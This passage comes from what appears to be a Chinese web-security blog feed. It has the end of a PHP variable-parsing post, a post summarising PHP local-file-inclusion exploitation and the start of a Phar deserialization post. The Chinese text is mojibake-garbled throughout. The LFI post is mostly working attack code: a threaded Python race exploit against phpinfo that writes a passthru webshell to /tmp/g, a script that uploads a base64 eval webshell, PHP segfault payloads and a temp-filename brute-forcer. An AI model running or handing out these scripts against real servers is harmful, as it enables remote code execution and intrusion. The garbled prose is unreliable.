è¿™é‡Œæ³¨æ„äº†ï¼Œâ€‹<code>$str</code>æ­¤æ—¶æ˜¯å·¦å€¼ï¼Œä¹Ÿå³ä½äºèµ‹å€¼è¯­å¥çš„å·¦ä¾§ï¼Œè€Œå·¦å€¼å¿…é¡»å¾—æ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿå³å¿…é¡»ç”±å­—ç¬¦$å¼€å¤´ï¼Œæ˜¾ç„¶payload1çš„å¼€å¤´å­—ç¬¦æ˜¯{ï¼Œå› æ­¤å®ƒå‹æ ¹ä¸æ˜¯ä¸€ä¸ªå˜é‡ï¼Œæ­¤æ—¶å‰é¢æˆ‘ä»¬æ‰€è°ˆçš„å˜é‡è§£æçš„ç‰¹æ€§éƒ½æ²¡æœ‰ç”¨ã€‚</p>
<h2 id="0x04-å‚è€ƒæ–‡ç« ">0x04 å‚è€ƒæ–‡ç« </h2>
<p><a href="https://www.andseclab.com/2020/01/22/php%e5%a4%8d%e6%9d%82%e5%8f%98%e9%87%8f%e8%a7%a3%e6%9e%90%e5%ad%a6%e4%b9%a0%e8%ae%b0%e5%bd%95/">ADæ”»é˜²å®éªŒå®¤</a></p>
<p><a href="https://www.anquanke.com/post/id/176331#h2-4">https://www.anquanke.com/post/id/176331#h2-4</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Webå®‰å…¨åŸºç¡€</tag>
        <tag>PHPå˜é‡è§£æ</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP LFIåˆ©ç”¨æ€»ç»“</title>
    <url>/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="PHP-LFIåˆ©ç”¨æ€»ç»“">PHP LFIåˆ©ç”¨æ€»ç»“</h1>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/177491">https://www.anquanke.com/post/id/177491</a></p>
</blockquote>
<h2 id="proc-self-environ">proc/self/environ</h2>
<p><strong>å‰ç½®æ¡ä»¶</strong></p>
<ul>
<li>phpä»¥cgiæ–¹å¼è¿è¡Œï¼Œè¿™æ ·environæ‰ä¼šä¿æŒUAå¤´ã€‚</li>
<li>environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</li>
</ul>
<p><strong>åˆ©ç”¨æ–¹å¼</strong></p>
<p>å¦‚æœå¯ä»¥è¯»å–ï¼Œä¿®æ”¹<code>User-Agent</code>ä¸ºphpä»£ç ï¼Œç„¶ålfiç‚¹åŒ…å«ï¼Œå®ç°rceã€‚</p>
<h2 id="proc-self-fd-1-2-3â€¦">proc/self/fd/1,2,3â€¦</h2>
<p><strong>å‰ç½®æ¡ä»¶</strong></p>
<ul>
<li>
<p>phpä»¥cgiæ–¹å¼è¿è¡Œã€‚</p>
</li>
<li>
<p>environæ–‡ä»¶å­˜å‚¨ä½ç½®å·²çŸ¥ï¼Œä¸”environæ–‡ä»¶å¯è¯»ã€‚</p>
</li>
</ul>
<p>ç±»ä¼¼äº<code>/proc/self/environ</code>ï¼Œä¸åŒæ˜¯åœ¨<code>referer</code>æˆ–æŠ¥é”™ç­‰å†™å…¥phpä»£ç ï¼Œç„¶ålfiç‚¹åŒ…å«ï¼Œå®ç°rceã€‚</p>
<h2 id="PHPä¼ªåè®®">PHPä¼ªåè®®</h2>
<h3 id="å¸¸ç”¨ä¼ªåè®®">å¸¸ç”¨ä¼ªåè®®</h3>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200921104109.png" alt=""></p>
<h3 id="expect">expect://</h3>
<p><strong>å‰ç½®æ¡ä»¶</strong></p>
<ul>
<li>é»˜è®¤ä¸å¼€å¯ï¼Œéœ€è¦å®‰è£…PECL packageæ‰©å±•</li>
<li>éœ€è¦<code>allow_url_include</code>å¼€å¯</li>
</ul>
<p><strong>åˆ©ç”¨æ–¹å¼</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expect:&#x2F;&#x2F;[command]</span><br></pre></td></tr></table></figure>
<h2 id="æ—¥å¿—">æ—¥å¿—</h2>
<h3 id="Apacheæ—¥å¿—">Apacheæ—¥å¿—</h3>
<p>åœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œlogçš„åœ°å€æ˜¯è¢«ä¿®æ”¹æ‰çš„ã€‚ä½ å¯ä»¥é€šè¿‡è¯»å–ç›¸åº”çš„é…ç½®æ–‡ä»¶åï¼Œå†è¿›è¡ŒåŒ…å«ã€‚</p>
<p>CTFå®ä¾‹ï¼š</p>
<p><a href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two</a></p>
<h2 id="with-phpinfo">with phpinfo</h2>
<p>åœ¨å¯ä»¥è®¿é—®phpinfoçš„æƒ…å†µä¸‹ï¼Œç–¯ç‹‚ä¸Šä¼ å¤§æ–‡ä»¶ï¼ŒåŒæ—¶åœ¨phpinfoä¸­å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶åœ¨tmpç›®å½•ä¸‹çš„æ–‡ä»¶åï¼Œæ¡ä»¶ç«äº‰ï¼Œåœ¨æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰åŒ…å«è¿›æ¥getshellã€‚</p>
<p>åˆ©ç”¨è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">def setup(host, port):</span><br><span class="line">    TAG=<span class="string">&quot;Security Test&quot;</span></span><br><span class="line">    PAYLOAD=<span class="string">&quot;&quot;</span><span class="string">&quot;%sr</span></span><br><span class="line"><span class="string">&lt;?php <span class="subst">$c</span>=fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;);fwrite(<span class="subst">$c</span>,&#x27;&lt;?php passthru(<span class="subst">$_GET</span>[&quot;</span>f<span class="string">&quot;]);?&gt;&#x27;);?&gt;r&quot;</span><span class="string">&quot;&quot;</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">&quot;&quot;</span><span class="string">&quot;-----------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;</span>dummyname<span class="string">&quot;; filename=&quot;</span>test.txt<span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: text/plainr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--r&quot;</span><span class="string">&quot;&quot;</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">&quot;A&quot;</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">&quot;&quot;</span><span class="string">&quot;POST /phpinfo.php?a=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot; HTTP/1.1r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: &quot;</span><span class="string">&quot;&quot;</span> + padding + <span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: &quot;</span><span class="string">&quot;&quot;</span>+padding+<span class="string">&quot;&quot;</span><span class="string">&quot;r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714r</span></span><br><span class="line"><span class="string">Content-Length: %sr</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">%s&quot;</span><span class="string">&quot;&quot;</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script</span></span><br><span class="line"><span class="comment">#     LFIREQ=&quot;&quot;&quot;GET /lfi.php?file=%s%%00 HTTP/1.1r</span></span><br><span class="line"><span class="comment"># User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="comment"># Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="comment"># Host: %sr</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># r</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line">    LFIREQ=<span class="string">&quot;&quot;</span><span class="string">&quot;GET /lfi.php?file=%s HTTP/1.1r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Aliver</span></span><br><span class="line"><span class="string">Host: %sr</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">r</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line">def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&amp;gt&quot;</span>)</span><br><span class="line">        fn = d[i+17:i+31]</span><br><span class="line">        <span class="comment"># print fn</span></span><br><span class="line">    except ValueError:</span><br><span class="line">        <span class="keyword">return</span> None</span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (<span class="function"><span class="keyword">fn</span>, <span class="title">host</span>))</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = <span class="title">s2</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">s2</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">d</span>.<span class="title">find</span>(<span class="params">tag</span>) != -1:</span></span><br><span class="line"><span class="function">        <span class="title">return</span> <span class="title">fn</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">counter</span>=0</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ThreadWorker</span>(<span class="params">threading.Thread</span>):</span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">__init__</span>(<span class="params"><span class="built_in">self</span>, e, l, m, *args</span>):</span></span><br><span class="line"><span class="function">        <span class="title">threading</span>.<span class="title">Thread</span>.<span class="title">__init__</span>(<span class="params"><span class="built_in">self</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">event</span> = <span class="title">e</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">lock</span> = <span class="title">l</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">maxattempts</span> = <span class="title">m</span></span></span><br><span class="line"><span class="function">        <span class="title">self</span>.<span class="title">args</span> = <span class="title">args</span></span></span><br><span class="line"><span class="function">    <span class="title">def</span> <span class="title">run</span>(<span class="params"><span class="built_in">self</span></span>):</span></span><br><span class="line"><span class="function">        <span class="title">global</span> <span class="title">counter</span></span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="title">not</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">            <span class="title">with</span> <span class="title">self</span>.<span class="title">lock</span>:</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">counter</span> &gt;= <span class="title">self</span>.<span class="title">maxattempts</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">return</span></span></span><br><span class="line"><span class="function">                <span class="title">counter</span>+=1</span></span><br><span class="line"><span class="function">            <span class="title">try</span>:</span></span><br><span class="line"><span class="function">                <span class="title">x</span> = <span class="title">phpInfoLFI</span>(<span class="params">*<span class="built_in">self</span>.args</span>)</span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">self</span>.<span class="title">event</span>.<span class="title">is_set</span>(<span class="params"></span>):</span></span><br><span class="line"><span class="function">                    <span class="title">break</span></span></span><br><span class="line"><span class="function">                <span class="title">if</span> <span class="title">x</span>:</span></span><br><span class="line"><span class="function">                    <span class="title">print</span> &quot;<span class="title">nGot</span> <span class="title">it</span>! <span class="title">Shell</span> <span class="title">created</span> <span class="title">in</span> /<span class="title">tmp</span>/<span class="title">g</span>&quot;</span></span><br><span class="line"><span class="function">                    <span class="title">self</span>.<span class="title">event</span>.<span class="title">set</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">            <span class="title">except</span> <span class="title">socket</span>.<span class="title">error</span>:</span></span><br><span class="line"><span class="function">                <span class="title">return</span></span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">getOffset</span>(<span class="params">host, port, phpinforeq</span>):</span></span><br><span class="line"><span class="function">    &quot;&quot;&quot;<span class="title">Gets</span> <span class="title">offset</span> <span class="title">of</span> <span class="title">tmp_name</span> <span class="title">in</span> <span class="title">the</span> <span class="title">php</span> <span class="title">output</span>&quot;&quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">s</span> = <span class="title">socket</span>.<span class="title">socket</span>(<span class="params">socket.AF_INET, socket.SOCK_STREAM</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">connect</span>(<span class="params">(<span class="params">host,port</span>)</span>)</span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">send</span>(<span class="params">phpinforeq</span>)</span></span><br><span class="line"><span class="function">    <span class="title">d</span> = &quot;&quot;</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="title">True</span>:</span></span><br><span class="line"><span class="function">        <span class="title">i</span> = <span class="title">s</span>.<span class="title">recv</span>(<span class="params"><span class="number">4096</span></span>)</span></span><br><span class="line"><span class="function">        <span class="title">d</span>+=<span class="title">i</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span> == &quot;&quot;:</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">        # <span class="title">detect</span> <span class="title">the</span> <span class="title">final</span> <span class="title">chunk</span></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="title">i</span>.<span class="title">endswith</span>(<span class="params"><span class="string">&quot;0rnrn&quot;</span></span>):</span></span><br><span class="line"><span class="function">            <span class="title">break</span></span></span><br><span class="line"><span class="function">    <span class="title">s</span>.<span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    <span class="title">i</span> = <span class="title">d</span>.<span class="title">find</span>(<span class="params"><span class="string">&quot;[tmp_name] =&amp;gt&quot;</span></span>)</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">i</span> == -1:</span></span><br><span class="line"><span class="function">        <span class="title">raise</span> <span class="title">ValueError</span>(<span class="params"><span class="string">&quot;No php tmp_name in phpinfo output&quot;</span></span>)</span></span><br><span class="line">    print &quot;found %s at %i&quot; % (d[i:i+10],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;LFI With PHPInfo()&quot;</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;-=&quot;</span> * <span class="number">30</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    except socket.<span class="built_in">error</span>, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = <span class="keyword">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = <span class="keyword">int</span>(sys.argv[<span class="number">3</span>])</span><br><span class="line">    except IndexError:</span><br><span class="line">        pass</span><br><span class="line">    except ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Getting initial offset...&quot;</span>,</span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> not e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            with l:</span><br><span class="line">                sys.stdout.write( <span class="string">&quot;r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;Woot! m/&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;:(&quot;</span></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;nTelling threads to shutdown...&quot;</span></span><br><span class="line">        e.set()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t in tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="with-phpå´©æºƒ">with phpå´©æºƒ</h2>
<h3 id="php-segfault">php segfault</h3>
<p>å‘PHPå‘é€å«æœ‰æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…æ—¶ï¼Œè®©PHPå¼‚å¸¸å´©æºƒé€€å‡ºï¼ŒPOSTçš„ä¸´æ—¶æ–‡ä»¶å°±ä¼šè¢«ä¿ç•™</p>
<p><strong>1. php &lt; 7.2</strong></p>
<p><code>php://filter/string.strip_tags/resource=/etc/passwd</code></p>
<p><strong>2. php7 è€ç‰ˆæœ¬é€šæ€</strong></p>
<p><code>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</code></p>
<p>åˆ©ç”¨è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># phpå´©æºƒ ç”Ÿæˆå¤§é‡ä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">def upload_file(url, file_content):</span><br><span class="line">    files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.post(url, files=files)</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br><span class="line"></span><br><span class="line">charset = <span class="keyword">string</span>.digits+<span class="keyword">string</span>.letters</span><br><span class="line">webshell = <span class="string">&#x27;&lt;?php eval($_REQUEST[daolgts]);?&gt;&#x27;</span>.encode(<span class="string">&quot;base64&quot;</span>).strip()</span><br><span class="line">file_content = <span class="string">&#x27;&lt;?php if(file_put_contents(&quot;/tmp/daolgts&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;success&quot;;&#125;?&gt;&#x27;</span> % (webshell)</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line">payload1=<span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">payload2=r<span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">lfi_url = url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=&quot;</span>+payload1</span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i in xrange(times):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line">    upload_file(lfi_url, file_content)</span><br></pre></td></tr></table></figure>
<h3 id="çˆ†ç ´tmpæ–‡ä»¶å">çˆ†ç ´tmpæ–‡ä»¶å</h3>
<p>ç„¶åçˆ†ç ´ä¸´æ—¶æ–‡ä»¶åæ¥åŒ…å«</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">base_url=<span class="string">&quot;&quot;</span></span><br><span class="line">parameter=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> charset:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> charset:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> charset:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> charset:</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> charset:</span><br><span class="line">                    <span class="keyword">for</span> n <span class="keyword">in</span> charset:</span><br><span class="line">                        filename = i + j + k + l + m + n</span><br><span class="line">                        url = base_url+<span class="string">&quot;?&quot;</span>+parameter+<span class="string">&quot;=/tmp/php&quot;</span>+filename</span><br><span class="line">                        <span class="keyword">print</span> url</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            response = requests.get(url)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> response.content:</span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;[+] Include success!&quot;</span></span><br><span class="line">                                <span class="keyword">print</span> <span class="string">&quot;url:&quot;</span>+url</span><br><span class="line">                                exit()</span><br><span class="line">                        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                            <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure>
<h2 id="session">session</h2>
<p><strong>åˆ©ç”¨æ¡ä»¶</strong></p>
<p>sessionæ–‡ä»¶è·¯å¾„å·²çŸ¥ï¼Œä¸”å…¶ä¸­å†…å®¹éƒ¨åˆ†å¯æ§ã€‚</p>
<p><strong>åˆ©ç”¨æ–¹å¼</strong></p>
<blockquote>
<p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<code>session.upload_progress.name</code>åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨<code>$_SESSION</code>ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨<code>$_SESSION</code>ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ <code>session.upload_progress.prefix</code>ä¸<code>session.upload_progress.name</code>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´sessionä¸­ä¼šæ·»åŠ <code>session.upload_progress.prefix</code>+<code>$_POST[ini_get['session.upload_progress.name']]</code>,è€Œ<code>session.upload_progress.name</code>æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥åœ¨sessionå†™å…¥phpä»£ç ï¼Œç„¶ååŒ…å«sessionæ–‡ä»¶æ¥rce</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–å­¦ä¹ -Pharååºåˆ—åŒ–</title>
    <url>/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–å­¦ä¹ â€”â€”Pharååºåˆ—åŒ–">PHPååºåˆ—åŒ–å­¦ä¹ â€”â€”Pharååºåˆ—åŒ–</h1>
<h2 id="PharåŸç†">PharåŸç†</h2>
<p>pharçš„æœ¬è´¨æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200512093032.png" alt=""></p>
<h3 id="Phar-demo">Phar demo</h3>
<p>æ ¹æ®æ–‡ä»¶ç»“æ„æˆ‘ä»¬æ¥è‡ªå·±æ„å»ºä¸€ä¸ªpharæ–‡ä»¶ï¼Œphpå†…ç½®äº†ä¸€ä¸ªPharç±»æ¥å¤„ç†ç›¸å…³æ“ä½œã€‚</p>
<blockquote>
<p><strong>è¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOffï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</strong></p>
</blockquote>
<p>phar.php</p>
